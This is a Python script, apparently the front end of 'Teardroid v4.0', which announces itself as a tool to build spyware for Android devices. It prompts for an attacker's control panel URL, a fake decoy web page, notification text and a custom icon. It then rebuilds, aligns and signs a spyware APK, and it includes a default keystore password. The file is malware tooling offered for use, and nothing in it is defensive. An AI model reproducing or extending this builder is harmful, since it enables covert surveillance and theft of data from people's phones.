# Author : script1337 [script@hacksec.in]
# Website : https://www.hacksec.in
# Date : Wednesday, 26 January 2022
# Time : 04:04 AM

from platform import python_version
from pyfiglet import Figlet
from pydantic import BaseModel
import argparse
import sys
import os
from time import sleep
from Builder import Teardroid as TeardroidBuilder
from colorama import Fore, Style
import emoji


def check_python():
    python_info = python_version().split(".")
    if int(python_info[0]) == 3 and int(python_info[1]) > 8:
        print("[+] Checking Python Version")
        print("[+] Python Version : " +
              python_info[0] + "." + python_info[1] + " \N{check mark}")
        return True
    else:
        return False


if check_python() == False:
    print("[!] Python version is not supported. Please use Python 3.8 or higher ")
    sys.exit(0)


class Config(BaseModel):
    apktool: str = os.path.join(os.getcwd(), "apktool.sh")
    version: str = 'Teardroid v4.0'
    current_dir: str = os.getcwd()


config = Config()
parser = argparse.ArgumentParser()

parser.add_argument('-v', '--version', help='Version of Teardroid 🥴',
                    action='version', version=config.version)

parser.add_argument(
    '-b', '--build', help='Build Teardroid with custom name [ex: Teardroid.py -b teardroid] 😷', metavar='')


def banner() -> str:
    f = Figlet(font='slant')
    return f.renderText("Teardroid v4")

def icon_change_tutorial() -> str:
    Tutorial = r"""Please navigate to the website https://easyappicon.com using your preferred web browser. 
From there, you may upload the desired image to be used as the icon for your application. 
The website will generate a compressed ZIP file containing all the necessary files. 
Once the ZIP file has been downloaded, 
extract its contents to a folder of your choosing.
inside that folder there will be a android folder containing all the necessary files.
copy the android folder full path and paste it into the promote.
or leave it blank if you want to use the default icon.
example: D:\xxxx\ic_launcher-6446b783efdd6\ic_launcher-6446b783efdd6\android"""
    return Tutorial
    
def builder(name: str) -> None:
    APKTOOL = None
    try:
        url = input("Control Panel URL : ")
        fake_web_page = input("Fake web homepage url : ")
        NotificationText = input("Notification Title : ")
        NotificationContent = input("Notification Content : ")
        NotificationSubText = input("Notification Subtext : ")
    except:
        sys.exit(0)
        print("GoodBye")

    Teardroid = TeardroidBuilder(name)
    Teardroid.print_result(icon_change_tutorial())
    Icon_path = input("Android icon folder path (leave blank if you wanna go with the default icon): ")
    if Icon_path != "" and Icon_path != None:
        if os.path.isdir(Icon_path):
            Teardroid.Change_icon(Icon_path)
        else:
            Teardroid.print_result("Invalid Icon path location")
            Teardroid.print_result("using defualt icon")
    if os.path.isfile(name + ".apk"):
        Teardroid.print_result("Removing old APK")
        os.remove(name + ".apk")
    if Teardroid.key_config.ks == "hacksec.jks" and Teardroid.key_config.ks_pass == "root1337":
        Teardroid.print_result("using the default keystore to sing the apk its not recommended")
        Teardroid.print_result("create a new keystore and change the values in the config.py file to use your own keystore instead")
    Teardroid.changeAppname()
    Teardroid.changeHostname(url)
    Teardroid.ChangeFakeWebPage(fake_web_page)
    Teardroid.changeNotification(
        NotificationText, NotificationContent, NotificationSubText)
    Teardroid.print_result("Compiling Teardroid using apktool")

    if Teardroid.os == "posix":
        APKTOOL = os.path.join(os.getcwd(), "apktool.sh")
    else:
        APKTOOL = os.path.join(os.getcwd(), "apktool.bat")
    os.system(APKTOOL + " b "+Teardroid.source_folder+" -o " +
              name + "_uncompressed.apk")
    Teardroid.print_result("Compiling Teardroid completed")
    Teardroid.print_result("Compressing APK Files using zipalign")
    Teardroid.CompressAPK()
    Teardroid.print_result("Signing Teardroid")
    Teardroid.SingAPK()
    Teardroid.Clear()
    Teardroid.print_result("Proccess Completed Successfully")
    Teardroid.print_result(
        "Saved as " + os.path.join(os.getcwd(), name + ".apk"))


if __name__ == '__main__':
    print(Fore.GREEN + banner())
    print(Fore.RED +
          "Teardroid v4.0 - A tool to build teardroid spyware for Android devices. \N{spider}")
    print(Fore.BLUE +
          "Contact us : https://t.me/script1337 \N{rocket}" + Fore.GREEN)
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    args = parser.parse_args()
    builder(args.build)
